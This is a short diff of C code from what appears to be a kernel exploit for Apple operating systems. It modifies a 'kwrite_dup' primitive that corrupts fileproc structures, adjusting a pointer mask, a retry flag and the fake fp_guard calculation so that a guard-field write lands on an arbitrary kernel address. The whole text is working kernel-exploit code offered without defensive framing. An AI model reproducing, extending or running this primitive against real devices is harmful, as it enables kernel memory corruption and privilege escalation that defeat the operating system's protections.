@@ -40,7 +40,7 @@ bool kwrite_dup_search(struct kfd* kfd, u64 object_uaddr)
         (fp->fp_vflags == 0) &&
         (fp->fp_flags == 0) &&
         (fp->fp_guard_attrs == 0) &&
-        (fp->fp_glob > ptr_mask) &&
+        (fp->fp_glob > PTR_MASK) &&
         (fp->fp_guard == 0)) {
         for (u64 object_id = kfd->kwrite.krkw_searched_id; object_id < kfd->kwrite.krkw_allocated_id; object_id++) {
             assert_bsd(fcntl(fds[object_id], F_SETFD, FD_CLOEXEC));
@@ -103,7 +103,7 @@ void kwrite_dup_kwrite_u64(struct kfd* kfd, u64 kaddr, u64 new_value)
     u64 fileproc_uaddr = kfd->kwrite.krkw_object_uaddr;
     volatile struct fileproc* fp = (volatile struct fileproc*)(fileproc_uaddr);
 
-    const bool allow_retry = true;
+    const bool allow_retry = false;
 
     do {
         u64 old_value = 0;
@@ -123,7 +123,7 @@ void kwrite_dup_kwrite_u64(struct kfd* kfd, u64 kaddr, u64 new_value)
         fp->fp_guard_attrs = new_fp_guard_attrs;
 
         u64 old_fp_guard = fp->fp_guard;
-        u64 new_fp_guard = kaddr - kfd_offset(fileproc_guard__fpg_guard);
+        u64 new_fp_guard = kaddr - offsetof(struct fileproc_guard, fpg_guard);
         fp->fp_guard = new_fp_guard;
 
         u64 guard = old_value;
